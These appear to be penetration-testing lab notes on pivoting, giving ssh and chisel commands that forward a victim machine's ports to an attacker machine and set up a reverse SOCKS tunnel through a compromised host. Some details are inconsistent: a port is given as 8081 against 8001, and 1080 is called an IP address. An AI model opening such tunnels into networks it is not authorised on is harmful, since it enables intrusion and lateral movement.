# Port Redirection and Tunneling
--------

## Local Port Forward
-----
Forward a port running on victim machine to the attack machine.
Eg: Forward port 80 on victim machine to attack machine port 8001

Using **ssh** 
```bash
ssh -N -L 0.0.0.0:8001:192.168.197.99:80 ariah@192.168.197.99
```

Using **chisel**
```bash
./chisel_linux server -p 80 -reverse
```

The port 80 here can be any random port for the chisel server to run; here port 80 is chosen because the victim is allowed to connect to port 80 only.

```cmd
chis.exe client 192.168.49.197:80 R:8001:127.0.0.1:80 
```

client makes a connection to chisel server running on port 80 and forwards localhost 80 on victim  machine to remote 8081 (attacker 8081)

----------------------

## Dynamic Port Forwarding
-------
Forwarding all traffic from our machine to the victim using another compromised machine as tunnel.
For use w proxychains.

Using **ssh**
```bash
ssh -N -D 127.0.0.1:1080 sean@10.11.1.251
```

where 1080 is the IP address where socks5 proxy is running.

Using **chisel**
```bash
./chisel_linux server -p 8000 -reverse
```

```bash
./chisel_linux client 192.168.119.183:8000 R:socks
```

Now we can use proxychains.

-------------
